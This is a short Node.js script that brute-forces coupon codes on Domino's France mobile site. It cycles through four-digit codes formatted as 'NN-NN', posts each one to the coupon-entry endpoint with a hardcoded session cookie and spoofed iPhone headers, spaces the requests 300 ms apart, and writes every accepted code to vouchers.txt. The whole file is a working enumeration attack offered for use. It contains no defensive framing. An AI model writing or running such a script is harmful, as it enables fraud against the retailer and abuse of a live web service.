import rp from 'request-promise'
import fs from 'fs'

const send = (code) => {
    return rp({
        method: 'POST',
        uri: 'http://mobile.dominos.fr/fr/coupons/saisie',
        form: {
            'coupon-part-1': `${code}`
        },
        headers: {
            'Content-Length': code.length,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Connection': 'keep-alive',
            // Create your own session
            'Cookie': 'ServerID=1036; PHPSESSID=5efd2c34ebe972f0dbe1b4b30e791d72; ry_ry-fx33aenn_realytics=eyJpZCI6InJ5X0ZGNkY0QzU4LTIxOTUtNDcwRS04MTNFLUVDNUQ2NTI3RDg5OCIsImNpZCI6bnVsbCwiZXhwIjoxNTA4ODQxOTA2NTE3fQ%3D%3D; _dc_gtm_UA-7753040-5=1; _gat_UA-7753040-5=1; _ga=GA1.3.515413482.1477305906; ry_ry-fx33aenn_so_realytics=eyJpZCI6InJ5X0ZGNkY0QzU4LTIxOTUtNDcwRS04MTNFLUVDNUQ2NTI3RDg5OCIsImNpZCI6bnVsbCwib3JpZ2luIjp0cnVlLCJyZWYiOm51bGwsImNvbnQiOm51bGx9',
            'Host': 'mobile.dominos.fr',
            'Origin': 'http://mobile.dominos.fr',
            'Referer': 'http://mobile.dominos.fr/fr/coupons/index/pickup/1477297123',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
            'X-Requested-With': 'XMLHttpRequest'
        }
    })
}

function DelayPromise(delay) {
    return function (data) {
        return new Promise(function (resolve, reject) {
            setTimeout(function () {
                resolve(data);
            }, delay);
        });
    }
}

for (let i = 1000; i < 9999; i++) {
    Promise.resolve().then(DelayPromise(300 * (i - 1000))).then((data) => {

        let split = i.toString().split('')
        let codeFormated = `${split[0]}${split[1]}-${split[2]}${split[3]}`
        return send(`${codeFormated}`)
            .then((body) => {
                console.log(`Test for ${codeFormated}`)
                let parsed = JSON.parse(body)
                if (parsed.isOK != 0) {
                    fs.appendFile('vouchers.txt', JSON.stringify({
                        code: `${codeFormated}`,
                        response: parsed
                    }))
                }
            })
            .catch((err) => {
                console.log(err)
            })
    });
}